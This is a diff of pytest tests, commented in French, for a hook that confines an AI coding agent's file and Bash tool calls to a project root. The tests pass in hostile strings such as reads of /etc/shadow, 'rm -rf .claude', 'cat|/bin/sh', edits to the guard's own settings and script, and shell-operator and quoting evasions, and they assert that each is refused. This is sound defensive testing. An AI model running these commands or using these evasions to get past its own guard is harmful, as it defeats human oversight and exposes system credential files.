+    code, err = run(script, charge("Bash", {"command": "cat /etc/shadow"}, cwd=racine))
+    assert code == 2
+    assert "REFUS" in err
+
+
+# 8. Bash sans aucun chemin littéral -> exit 0.
+def test_bash_sans_chemin_litteral_autorise(tmp_path, racine):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Bash", {"command": "echo ok"}, cwd=racine))
+    assert code == 0, err
+
+
+# 9. Symlink SORTANT : <racine>/lien -> /etc, lecture de <racine>/lien/passwd -> exit 2.
+def test_symlink_sortant_refuse(tmp_path, racine):
+    os.symlink("/etc", racine / "lien")
+    script = ecrire_garde(tmp_path, racine)
+    cible = racine / "lien" / "passwd"
+    code, err = run(script, charge("Read", {"file_path": str(cible)}, cwd=racine))
+    assert code == 2
+    assert "REFUS" in err
+
+
+# 10. Répertoire frère à préfixe commun : racine <base>/repo, cible <base>/repo-evil/x -> exit 2.
+def test_repertoire_frere_a_prefixe_commun_refuse(tmp_path, env_tmpdir):
+    base = tmp_path / "base"
+    root = base / "repo"
+    root.mkdir(parents=True)
+    cible = base / "repo-evil" / "x.txt"
+    script = ecrire_garde(tmp_path, root)
+    code, err = run(
+        script,
+        charge("Read", {"file_path": str(cible)}, cwd=root),
+        env=env_tmpdir,
+    )
+    assert code == 2
+    assert "REFUS" in err
+
+
+# 11. Auto-protection : settings.json, le script lui-même, le répertoire des hooks.
+def test_auto_protection_outils_ecriture_refuses(tmp_path):
+    dest = tmp_path / "projet"
+    dest.mkdir()
+    script_path, _hook = install_guard_fs(dest)
+    # Le script installé embarque le registre par défaut (~/.forgeai/...) :
+    # redirection de la journalisation vers tmp_path via la variable lue par la garde.
+    env = {"FORGEAI_REGISTRE": str(tmp_path / "registre.jsonl")}
+    cas = [
+        ("Write", {"file_path": str(dest / ".claude" / "settings.json"), "content": "{}"}),
+        ("Edit", {"file_path": str(script_path), "old_string": "a", "new_string": "b"}),
+        ("Write", {"file_path": str(dest / ".claude" / "hooks" / "autre.py"), "content": "x"}),
+    ]
+    for outil, tool_input in cas:
+        code, err = run(script_path, charge(outil, tool_input, cwd=dest), env=env)
+        assert code == 2, f"{outil} sur {tool_input['file_path']} doit être refusé"
+        assert "auto-protection" in err
+
+
+# 12. stdin vide -> exit 2 (fail-closed) ; stdin JSON invalide -> exit 2.
+def test_stdin_vide_et_json_invalide_refuses(tmp_path, racine):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, "")
+    assert code == 2
+    assert "REFUS" in err
+    code, err = run(script, "{ceci n'est pas du json")
+    assert code == 2
+    assert "REFUS" in err
+
+
+# 13. tool_input sans aucun chemin -> exit 0.
+def test_tool_input_sans_chemin_autorise(tmp_path, racine):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Read", {}, cwd=racine))
+    assert code == 0, err
+
+
+# 14. Outil inconnu sans chemin candidat -> exit 0.
+def test_outil_inconnu_sans_chemin_autorise(tmp_path, racine):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(
+        script,
+        charge("WebFetch", {"url": "https://example.com"}, cwd=racine),
+    )
+    assert code == 0, err
+
+
+# 15. JOURNALISATION : deux refus successifs, entrées "guard_fs_denied",
+# prev_hash chaîné, et chaîne acceptée par le verify officiel du produit.
+def test_journalisation_registre_et_verify_officiel(tmp_path, racine):
+    registre = tmp_path / "Registres" / "mission.jsonl"
+    script = ecrire_garde(tmp_path, racine, registre=registre)
+    cibles = ["/etc/passwd", "/etc/shadow"]
+    for cible in cibles:
+        code, _err = run(script, charge("Read", {"file_path": cible}, cwd=racine))
+        assert code == 2
+    lignes = registre.read_text(encoding="utf-8").splitlines()
+    assert len(lignes) == 2, f"2 refus journalisés attendus : {lignes}"
+    e1, e2 = (json.loads(ligne) for ligne in lignes)
+    racine_resolue = os.path.realpath(str(racine))
+    for entree, cible in ((e1, cibles[0]), (e2, cibles[1])):
+        assert entree["type"] == "guard_fs_denied"
+        assert entree["actor"] == "guard-fs"
+        assert entree["payload"]["tool"] == "Read"
+        assert entree["payload"]["chemin_resolu"] == os.path.realpath(cible)
+        assert entree["payload"]["racine"] == racine_resolue
+    assert e1["seq"] == 1
+    assert e2["seq"] == 2
+    assert e1["prev_hash"] == "0" * 64
+    assert e2["prev_hash"] == e1["hash"], "prev_hash de l'entrée 2 doit chaîner le hash de l'entrée 1"
+    # Vérification par le verify OFFICIEL du produit.
+    assert REGISTRE_PY.is_file(), f"verify officiel introuvable : {REGISTRE_PY}"
+    proc = subprocess.run(
+        [sys.executable, str(REGISTRE_PY), "verify", str(registre)],
+        text=True,
+        capture_output=True,
+        cwd=str(REPO_RACINE),
+    )
+    assert proc.returncode == 0, proc.stderr
+    assert "chaîne intègre" in (proc.stdout + proc.stderr)
+
+
+# 16. Journalisation impossible : le refus tient (exit 2) quand même.
+def test_journalisation_impossible_ne_leve_pas_le_refus(tmp_path, racine):
+    bloquant = tmp_path / "bloquant"
+    bloquant.write_text("un fichier là où un dossier est attendu", encoding="utf-8")
+    registre_bloque = bloquant / "sous" / "registre.jsonl"
+    script = ecrire_garde(tmp_path, racine, registre=registre_bloque)
+    code, err = run(script, charge("Read", {"file_path": "/etc/passwd"}, cwd=racine))
+    assert code == 2
+    assert "journalisation impossible" in err
+
+
+# 17. Exceptions : chemin hors racine mais listé dans allow_path -> exit 0 ;
+# tempfile.gettempdir() autorisé par défaut -> exit 0.
+def test_allow_list_et_tempdir_autorises(tmp_path, racine):
+    # a) /etc listé explicitement dans le fichier d'exceptions.
+    allow = tmp_path / "exceptions.allow"
+    allow.write_text("/etc\n", encoding="utf-8")
+    script_allow = ecrire_garde(tmp_path, racine, allow=allow, nom="garde_allow.py")
+    code, err = run(script_allow, charge("Read", {"file_path": "/etc/passwd"}, cwd=racine))
+    assert code == 0, err
+    # b) Aucun fichier d'exceptions : le tempdir reste autorisé par défaut.
+    script_defaut = ecrire_garde(
+        tmp_path, racine, allow=tmp_path / "allow-absente.txt", nom="garde_defaut.py"
+    )
+    hors_racine = Path(tempfile.mkdtemp()) / "secret.txt"
+    hors_racine.write_text("x", encoding="utf-8")
+    code, err = run(
+        script_defaut,
+        charge("Read", {"file_path": str(hors_racine)}, cwd=racine),
+    )
+    assert code == 0, err
+
+
+
+# 18. Auto-protection du SCRIPT, ISOLÉE de la protection du dossier hooks et de la
+#     règle de containment. Le script est généré À L'INTÉRIEUR de la racine mais
+#     HORS de <root>/.claude/hooks/ : un Edit du script n'est alors couvert QUE par
+#     `cible == SCRIPT_PATH` (il est dans la racine, donc containment l'autoriserait ;
+#     il n'est pas sous hooks/). Sans cette règle, la garde se laisse réécrire —
+#     c'est le cas que la mutation-test doit tuer.
+def test_auto_protection_du_script_dans_racine_hors_hooks(tmp_path, racine, env_tmpdir):
+    src = generate_guard_fs(
+        racine,
+        registre_path=tmp_path / "registre.jsonl",
+        allow_path=tmp_path / "guard-fs.allow",
+    )
+    # script placé DANS la racine, pas sous .claude/hooks/
+    script = racine / "garde_dans_racine.py"
+    script.write_text(src, encoding="utf-8")
+    code, err = run(script, charge("Edit", {"file_path": str(script)}, cwd=racine), env=env_tmpdir)
+    assert code == 2, f"le script doit se protéger même hors du dossier hooks (stderr={err!r})"
+
+
+# ─────────────── Tour 2 : non-régression de sécurité (revue scellée) ───────────────
+# La revue a REJETÉ (2/3) la première version : des chemins littéraux TRIVIAUX
+# passaient à travers le confinement Bash (tokens quotés, chemins relatifs sans
+# préfixe, chemins Windows), et le dossier .claude parent n'était pas protégé.
+# Chaque test ci-dessous LANCE le script généré et prouve la fermeture d'un
+# contournement précis. env_tmpdir est passé partout : sans lui, l'exception
+# tempdir autoriserait des cibles sous tmp_path.
+
+def test_bash_chemin_absolu_double_quote_refuse(racine, env_tmpdir, tmp_path):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Bash", {"command": 'cat "/etc/passwd"'}, cwd=racine), env=env_tmpdir)
+    assert code == 2, f"chemin quoté doit être refusé (stderr={err!r})"
+
+
+def test_bash_chemin_absolu_simple_quote_refuse(racine, env_tmpdir, tmp_path):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Bash", {"command": "cat '/etc/passwd'"}, cwd=racine), env=env_tmpdir)
+    assert code == 2, f"chemin quoté simple doit être refusé (stderr={err!r})"
+
+
+def test_bash_relatif_sans_prefixe_dossier_hooks_refuse(racine, env_tmpdir, tmp_path):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Bash", {"command": "rm -rf .claude/hooks"}, cwd=racine), env=env_tmpdir)
+    assert code == 2, f"rm -rf .claude/hooks (relatif) doit être refusé (stderr={err!r})"
+
+
+def test_bash_dossier_claude_lui_meme_refuse(racine, env_tmpdir, tmp_path):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Bash", {"command": "rm -rf .claude"}, cwd=racine), env=env_tmpdir)
+    assert code == 2, f"rm -rf .claude (le dossier entier) doit être refusé (stderr={err!r})"
+
+
+def test_bash_traversal_relatif_refuse(racine, env_tmpdir, tmp_path):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Bash", {"command": "cat foo/../../../etc/passwd"}, cwd=racine), env=env_tmpdir)
+    assert code == 2, f"traversal relatif doit être refusé (stderr={err!r})"
+
+
+# O2 (chemins Windows) se prouve à deux niveaux. Sur POSIX, `C:\\...` n'est PAS
+# absolu : realpath le traite comme un nom relatif dans le cwd, donc DANS la
+# racine — refuser serait faux. Le correctif consiste à ne plus IGNORER le token
+# (il est capté comme candidat) ; ce fait est vérifiable partout. Le REFUS effectif
+# n'a lieu que là où `C:\\` est réellement absolu, c.-à-d. sur Windows.
+def test_source_capte_les_chemins_windows_comme_candidats(racine):
+    # Preuve portable : le code de détection d'un lecteur Windows est present dans
+    # le script généré — le token n'est donc plus ignoré (traitement de O2).
+    src = generate_guard_fs(racine)
+    assert "[A-Za-z]:" in src, "la détection de chemin Windows doit être présente dans la garde"
+
+
+@pytest.mark.skipif(
+    os.name != "nt",
+    reason=("Le REFUS d'un chemin absolu Windows n'est observable que sur Windows, ou "
+            "`C:\\...` est absolu (sur POSIX c'est un nom relatif, legitimement dans la "
+            "racine). Preuve portable dans le test source ci-dessus ; ce test TOURNE sur "
+            "les runners Windows (preuve B-24 au Registres/mission.jsonl)."),
+)
+def test_bash_chemin_windows_refuse_sur_windows(racine, env_tmpdir, tmp_path):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Bash", {"command": "type C:\\Windows\\System32\\x"}, cwd=racine), env=env_tmpdir)
+    assert code == 2, f"chemin Windows absolu doit être refusé (stderr={err!r})"
+
+
+def test_auto_protection_mv_du_script_installe_refuse(racine, env_tmpdir):
+    # install_guard_fs place le script sous racine/.claude/hooks/ : un mv qui le
+    # cible par son chemin relatif (avec séparateur) est capté et refusé.
+    script, _hook = install_guard_fs(racine)
+    code, err = run(
+        script,
+        charge("Bash", {"command": "mv .claude/hooks/forgeai_guard_fs.py /tmp/x"}, cwd=racine),
+        env=env_tmpdir,
+    )
+    assert code == 2, f"mv du script installé doit être refusé (stderr={err!r})"
+
+
+def test_cwd_relatif_refus_structurel(racine, env_tmpdir, tmp_path):
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Read", {"file_path": "a"}, cwd="relatif/non/absolu"), env=env_tmpdir)
+    assert code == 2, f"cwd relatif doit provoquer un refus fail-closed (stderr={err!r})"
+
+
+def test_cwd_absent_refus_structurel(racine, env_tmpdir, tmp_path):
+    script = ecrire_garde(tmp_path, racine)
+    charge_sans_cwd = {"tool_name": "Read", "tool_input": {"file_path": "a"}}
+    code, err = run(script, charge_sans_cwd, env=env_tmpdir)
+    assert code == 2, f"cwd absent doit provoquer un refus fail-closed (stderr={err!r})"
+
+
+def test_non_regression_commandes_sans_chemin_autorisees(racine, env_tmpdir, tmp_path):
+    script = ecrire_garde(tmp_path, racine)
+    for cmd in ("echo bonjour", "ls -la"):
+        code, err = run(script, charge("Bash", {"command": cmd}, cwd=racine), env=env_tmpdir)
+        assert code == 0, f"commande sans chemin doit être autorisée: {cmd!r} (stderr={err!r})"
+
+
+def test_non_regression_chemin_relatif_dans_racine_autorise(racine, env_tmpdir, tmp_path):
+    (racine / "sous").mkdir()
+    (racine / "sous" / "fichier.txt").write_text("x", encoding="utf-8")
+    script = ecrire_garde(tmp_path, racine)
+    code, err = run(script, charge("Bash", {"command": "cat sous/fichier.txt"}, cwd=racine), env=env_tmpdir)
+    assert code == 0, f"chemin relatif restant dans la racine doit être autorisé (stderr={err!r})"
+
+
+def test_double_compile_source_et_fichier_installe(racine):
+    # CA-7 : le SOURCE rendu compile ET le fichier écrit sur disque compile aussi
+    # (deux passes distinctes).
+    src = generate_guard_fs(racine)
+    compile(src, "<source-genere>", "exec")
+    script, _hook = install_guard_fs(racine)
+    compile(Path(script).read_text(encoding="utf-8"), "<fichier-installe>", "exec")
+# AJOUTS dans tests/test_guard_fs.py (appendices aux tests existants)
+
+
+class TestOperateursColles:
+    r"""B-24d — ferme le contournement par opérateurs shell collés au chemin.
+
+    Mécanisme RÉEL : UN SEUL découpage de la commande brute sur la
+    classe des délimiteurs shell (``\s<>;|&()"'`$``), sans tokeniseur
+    dédié (shlex et son repli re.split ont été retirés). Les opérateurs
+    shell (``<``, ``>``, ``;``, ``|``, ``&``, ``(``, ``)``) sont DANS
+    la classe de découpage — donc un fragment collé ``cat</etc/passwd``
+    est correctement séparé en ``cat`` et ``/etc/passwd``. Le découpage
+    ne lève jamais d'exception (re.split ne lève pas sur des guillemets
+    déséquilibrés), donc aucun repli n'est possible. Périmètre inchangé
+    : extraction de fragments LITTÉRAUX uniquement, aucune interprétation
+    du shell. Ces tests exécutent RÉELLEMENT la garde générée via
+    subprocess et asserent l'exit code.
+    """
+
+    def test_cat_redirection_entree_collee_refuse(self, tmp_path, racine, env_tmpdir):
+        """``cat</etc/passwd`` : ``<`` collé à ``cat``, mais la cible
+        ``/etc/passwd`` DOIT être vue comme un chemin littéral et
+        REFUSÉE (sortie de la racine)."""
+        script = ecrire_garde(tmp_path, racine)
+        ch = charge("Bash", {"command": "cat</etc/passwd"}, cwd=racine)
+        exit_code, stderr = run(script, ch, env=env_tmpdir)
+        assert exit_code == 2, (
+            "cat</etc/passwd doit être refusé (exit 2) ; "
+            "shlex.split ne sépare pas '<' collé, mais shlex.shlex "
+            "avec punctuation_chars=True doit le faire. stderr="
+            f"{stderr!r}"
+        )
+
+    def test_echo_redirection_sortie_collee_refuse_settings(
+        self, tmp_path, racine, env_tmpdir
+    ):
+        """``echo bad>.claude/settings.json`` : ``>`` collé, contourne
+        l'auto-protection si mal tokenisé. Doit être REFUSÉ (exit 2)."""
+        script = ecrire_garde(tmp_path, racine)
+        ch = charge(
+            "Bash", {"command": "echo bad>.claude/settings.json"}, cwd=racine
+        )
+        exit_code, stderr = run(script, ch, env=env_tmpdir)
+        assert exit_code == 2, (
+            "echo bad>.claude/settings.json doit être refusé (exit 2) "
+            "pour protéger settings.json. stderr="
+            f"{stderr!r}"
+        )
+
+    def test_point_virgule_colle_refuse(self, tmp_path, racine, env_tmpdir):
+        """``cat;/etc/passwd`` : ``;`` collé à ``cat``. Doit refuser
+        l'accès à ``/etc/passwd``."""
+        script = ecrire_garde(tmp_path, racine)
+        ch = charge("Bash", {"command": "cat;/etc/passwd"}, cwd=racine)
+        exit_code, stderr = run(script, ch, env=env_tmpdir)
+        assert exit_code == 2, (
+            "cat;/etc/passwd doit être refusé (exit 2). stderr="
+            f"{stderr!r}"
+        )
+
+    def test_pipe_colle_refuse(self, tmp_path, racine, env_tmpdir):
+        """``cat|/bin/sh`` : ``|`` collé. ``/bin/sh`` doit être vu comme
+        un chemin littéral et REFUSÉ."""
+        script = ecrire_garde(tmp_path, racine)
+        ch = charge("Bash", {"command": "cat|/bin/sh"}, cwd=racine)
+        exit_code, stderr = run(script, ch, env=env_tmpdir)
+        assert exit_code == 2, (
+            "cat|/bin/sh doit être refusé (exit 2). stderr="
+            f"{stderr!r}"
+        )
+
+    def test_redirection_append_collee_refuse(self, tmp_path, racine, env_tmpdir):
+        """``echo x>>/etc/hosts`` : ``>>`` collé à ``x``. La cible
+        ``/etc/hosts`` doit être REFUSÉE (exit 2)."""
+        script = ecrire_garde(tmp_path, racine)
+        ch = charge("Bash", {"command": "echo x>>/etc/hosts"}, cwd=racine)
+        exit_code, stderr = run(script, ch, env=env_tmpdir)
+        assert exit_code == 2, (
+            "echo x>>/etc/hosts doit être refusé (exit 2). stderr="
+            f"{stderr!r}"
+        )
+
+    def test_non_regression_guillemet_superieur_dans_nom(
+        self, tmp_path, racine, env_tmpdir
+    ):
+        """NON-RÉGRESSION : un ``>`` LITTÉRAL entre guillemets fait
+        partie du nom de fichier, pas un opérateur.
+
+        Crée ``racine/fichier>bizarre.txt`` puis ``cat "fichier>bizarre.txt"``
+        avec cwd=racine doit être AUTORISÉ (exit 0)."""
+        cible = racine / "fichier>bizarre.txt"
+        cible.write_text("contenu\n", encoding="utf-8")
+        script = ecrire_garde(tmp_path, racine)
+        ch = charge(
+            "Bash", {"command": 'cat "fichier>bizarre.txt"'}, cwd=racine
+        )
+        exit_code, stderr = run(script, ch, env=env_tmpdir)
+        assert exit_code == 0, (
+            'cat "fichier>bizarre.txt" doit être autorisé (exit 0) ; '
+            "le '>' entre guillemets fait partie du nom de fichier. "
+            f"stderr={stderr!r}"
+        )
+
+    def test_non_regression_commandes_inoffensives(
+        self, tmp_path, racine, env_tmpdir
+    ):
+        """NON-RÉGRESSION : commandes sans chemin littéral, et commande
+        avec chemin LITTÉRAL SOUS LA RACINE, restent AUTORISÉES.
+
+        Couvre ``echo bonjour``, ``ls -la``, ``cat sous/fichier.txt``
+        avec fichier créé dans la racine et cwd=racine."""
+        sous = racine / "sous"
+        sous.mkdir()
+        (sous / "fichier.txt").write_text("ok\n", encoding="utf-8")
+
+        script = ecrire_garde(tmp_path, racine)
+        for cmd in ("echo bonjour", "ls -la", "cat sous/fichier.txt"):
+            ch = charge("Bash", {"command": cmd}, cwd=racine)
+            exit_code, stderr = run(script, ch, env=env_tmpdir)
+            assert exit_code == 0, (
+                f"{cmd!r} doit être autorisé (exit 0) — non-régression. "
+                f"stderr={stderr!r}"
+            )
+
+
+# ── Tour 4 : validation du cwd (revue scellée, objection critique Gemini) ──
+def test_cwd_hors_racine_nom_nu_refuse(tmp_path, racine, env_tmpdir):
+    """cwd=/etc + Bash 'cat passwd' -> exit 2.
+
+    « passwd » est un nom nu sans séparateur : l'extraction de candidats
+    l'ignore par construction — seul le contrôle du cwd peut refuser.
+    """
+    script = ecrire_garde(tmp_path, racine)
+    code, _ = run(
+        script,
+        charge("Bash", {"command": "cat passwd"}, cwd="/etc"),
+        env=env_tmpdir,
+    )
+    assert code == 2
+
+
+def test_cwd_sous_claude_autoprotection_refuse(tmp_path, racine, env_tmpdir):
+    """cwd=<racine>/.claude + Bash 'echo bad > settings.json' -> exit 2.
+
+    .claude est sous ROOT, donc le confinement seul laisserait passer :
+    c'est l'auto-protection du cwd (outil d'écriture) qui doit refuser.
+    """
+    (racine / ".claude").mkdir()
+    script = ecrire_garde(tmp_path, racine)
+    code, _ = run(
+        script,
+        charge(
+            "Bash",
+            {"command": "echo bad > settings.json"},
+            cwd=str(racine / ".claude"),
+        ),
+        env=env_tmpdir,
+    )
+    assert code == 2
+
+
+def test_cwd_hors_racine_sans_candidat_refuse(tmp_path, racine, env_tmpdir):
+    """cwd=/etc + Bash 'echo bonjour' -> exit 2 : le cwd seul suffit à
+    refuser, même sans aucun chemin candidat dans la commande."""
+    script = ecrire_garde(tmp_path, racine)
+    code, _ = run(
+        script,
+        charge("Bash", {"command": "echo bonjour"}, cwd="/etc"),
+        env=env_tmpdir,
+    )
+    assert code == 2
+
+
+def test_cwd_racine_commandes_inoffensives_autorisees(tmp_path, racine, env_tmpdir):
+    """Non-régression : cwd=racine — les commandes sans chemin restent
+    autorisées."""
+    script = ecrire_garde(tmp_path, racine)
+    for commande in ("echo bonjour", "ls -la"):
+        code, _ = run(
+            script,
+            charge("Bash", {"command": commande}, cwd=str(racine)),
+            env=env_tmpdir,
+        )
+        assert code == 0, commande
+
+
+def test_cwd_sous_repertoire_racine_autorise(tmp_path, racine, env_tmpdir):
+    """Non-régression : cwd = un sous-répertoire de la racine — un nom nu
+    qui s'y résout reste autorisé."""
+    sous = racine / "sous"
+    sous.mkdir()
+    (sous / "f.txt").write_text("contenu\n", encoding="utf-8")
+    script = ecrire_garde(tmp_path, racine)
+    code, _ = run(
+        script,
+        charge("Bash", {"command": "cat f.txt"}, cwd=str(sous)),
+        env=env_tmpdir,
+    )
+    assert code == 0
+
+
+def test_refus_cwd_journalise_et_chaine_verifiee(tmp_path, racine, env_tmpdir):
+    """Un refus de type cwd est journalisé en guard_fs_denied, et la chaîne
+    du registre est acceptée par le verify officiel du produit."""
+    reg = tmp_path / "registre.jsonl"
+    script = ecrire_garde(tmp_path, racine, registre=reg)
+    code, _ = run(
+        script,
+        charge("Bash", {"command": "cat passwd"}, cwd="/etc"),
+        env=env_tmpdir,
+    )
+    assert code == 2
+    lignes = [
+        ligne
+        for ligne in reg.read_text(encoding="utf-8").splitlines()
+        if ligne.strip()
+    ]
+    assert lignes, "le refus par cwd doit être journalisé"
+    for ligne in lignes:
+        json.loads(ligne)  # chaque entrée est un JSON valide
+    assert any("guard_fs_denied" in ligne for ligne in lignes)
+    proc = subprocess.run(
+        [sys.executable, str(REGISTRE_PY), "verify", str(reg)],
+        text=True,
+        capture_output=True,
+    )
+    assert proc.returncode == 0, proc.stderr
+
+
+# ── Tour 5 : le repli de tokenisation ne doit pas etre une porte ──
+def test_repli_heredoc_guillemet_orphelin_cible_hors_racine_refuse(
+    tmp_path, racine, env_tmpdir
+):
+    """Here-doc à guillemet orphelin, cible hors racine -> exit 2.
+
+    La commande contient un here-doc avec un guillemet orphelin. Le
+    mécanisme RÉEL de la garde (un seul découpage de la commande brute
+    sur la classe des délimiteurs shell, sans tokeniseur ni repli) ne
+    lève jamais d'exception : la cible littérale ``/etc/passwd`` est
+    extraite directement du flux de fragments et la garde la refuse.
+    `/etc/passwd` comme chemin hors racine et REFUSER.
+    """
+    script = ecrire_garde(tmp_path, racine)
+    commande = 'cat</etc/passwd\ncat <<EOF\n"\nEOF'
+    code, stderr = run(
+        script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir
+    )
+    assert code == 2, f"attendu exit 2, obtenu {code} (stderr={stderr!r})"
+
+
+def test_repli_cible_auto_protection_refuse(tmp_path, racine, env_tmpdir):
+    """Repli forcé, cible = auto-protection (.claude/settings.json) -> exit 2.
+
+    Le guillemet orphelin final force le ValueError de shlex ; le repli
+    doit malgré tout reconnaître `.claude/settings.json` comme chemin
+    protégé et REFUSER la réécriture de la config de la garde.
+    """
+    script = ecrire_garde(tmp_path, racine)
+    commande = 'echo bad >.claude/settings.json "'
+    code, stderr = run(
+        script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir
+    )
+    assert code == 2, f"attendu exit 2, obtenu {code} (stderr={stderr!r})"
+
+
+def test_repli_operateur_colle_cible_hors_racine_refuse(
+    tmp_path, racine, env_tmpdir
+):
+    """Repli forcé, opérateur COLLÉ et cible hors racine -> exit 2.
+
+    `cat</etc/passwd` a l'opérateur de redirection COLLÉ à la commande ;
+    le repli doit le séparer pour reconnaître `/etc/passwd` comme chemin
+    hors racine et REFUSER.
+    """
+    script = ecrire_garde(tmp_path, racine)
+    commande = 'cat</etc/passwd "'
+    code, stderr = run(
+        script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir
+    )
+    assert code == 2, f"attendu exit 2, obtenu {code} (stderr={stderr!r})"
+
+
+def test_repli_cible_dans_racine_autorise(tmp_path, racine, env_tmpdir):
+    """Repli forcé, cible RESTANT dans la racine -> exit 0.
+
+    Prouve que le repli n'est pas un refus aveugle : il analyse vraiment
+    les tokens et autorise une cible interne à la racine malgré le
+    guillemet orphelin qui déclenche le ValueError de shlex.
+    """
+    sous = racine / "sous"
+    sous.mkdir()
+    cible = sous / "f.txt"
+    cible.write_text("contenu", encoding="utf-8")
+    script = ecrire_garde(tmp_path, racine)
+    commande = 'cat sous/f.txt "'
+    code, stderr = run(
+        script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir
+    )
+    assert code == 0, f"attendu exit 0, obtenu {code} (stderr={stderr!r})"
+
+
+def test_non_regression_guillemets_equilibres_autorise(
+    tmp_path, racine, env_tmpdir
+):
+    """NON-RÉGRESSION du chemin NOMINAL : guillemets ÉQUILIBRÉS préservés.
+
+    Avec des guillemets équilibrés, shlex tokenise correctement
+    `fichier>bizarre.txt` comme un seul token littéral ; la garde ne le
+    reconnaît pas comme chemin (pas de `/`, pas de préfixe `~`/`.`,
+    pas de lecteur Windows) et l'AUTORISE. Ce test verrouille le chemin
+    nominal face à toute régression du repli.
+    """
+    cible = racine / "fichier>bizarre.txt"
+    cible.write_text("contenu", encoding="utf-8")
+    script = ecrire_garde(tmp_path, racine)
+    commande = 'cat "fichier>bizarre.txt"'
+    code, stderr = run(
+        script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir
+    )
+    assert code == 0, f"attendu exit 0, obtenu {code} (stderr={stderr!r})"
+
+
+# ── Tour 6 : extraction sans tokenisation shell (ADR option C) ──
+import json
+import os
+import subprocess
+import sys
+from pathlib import Path
+
+import pytest
+
+from forgeai.ide.guard_fs import generate_guard_fs
+
+
+# ---------------------------------------------------------------------------
+# AXE A — vecteurs d'evasion CAPTES (exit 2), cwd=racine
+# ---------------------------------------------------------------------------
+
+def test_A1_cat_guillemet_double_ferm_guillemet_simple(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": 'cat "/etc/passwd" "'}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 2
+
+
+def test_A2_cat_guillemet_simple_ferm_guillemet_double(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "cat '/etc/passwd' '"}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 2
+
+
+def test_A3_redirection_entree_chemin_colle(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": 'cat</etc/passwd "'}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 2
+
+
+def test_A4_redirection_sortie_vers_settings_json(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    commande = 'echo bad >".claude/settings.json" "'
+    c = charge("Bash", {"command": commande}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 2
+
+
+def test_A5_substitution_commande_chemin(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": 'cat $(echo /etc/passwd) "'}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 2
+
+
+def test_A6_heredoc_apostrophe_francaise(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    commande = "cat <<EOF\nc'est /etc/passwd\nEOF"
+    c = charge("Bash", {"command": commande}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 2
+
+
+def test_A7_cible_nue_collee_operateur(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "rm -rf>.claude"}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 2
+
+
+# ---------------------------------------------------------------------------
+# AXE B — non-regression syntaxique, AUCUN faux positif (exit 0)
+# ---------------------------------------------------------------------------
+
+def test_B1_apostrophe_dans_mot(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "echo l'utilisateur"}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 0
+
+
+def test_B2_apostrophe_guillemet_simple(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "grep don't fichier.txt"}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 0
+
+
+def test_B3_globe_etoile(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "ls *.py"}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 0
+
+
+def test_B4_variable_HOME_resolue_sous_racine(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "cat $HOME/truc"}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 0
+
+
+def test_B5_echo_bonjour(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "echo bonjour"}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 0
+
+
+# ---------------------------------------------------------------------------
+# AXE C — symetrie backslash
+# ---------------------------------------------------------------------------
+
+def test_C1_posix_backslash_chemin_absolu(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": 'cat \\/etc/passwd "'}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 2
+
+
+def test_C2a_windows_condition_apres_chemin_present_dans_source(tmp_path, racine):
+    """Sur Windows, le backslash fait partie des separateurs chemins : on ne
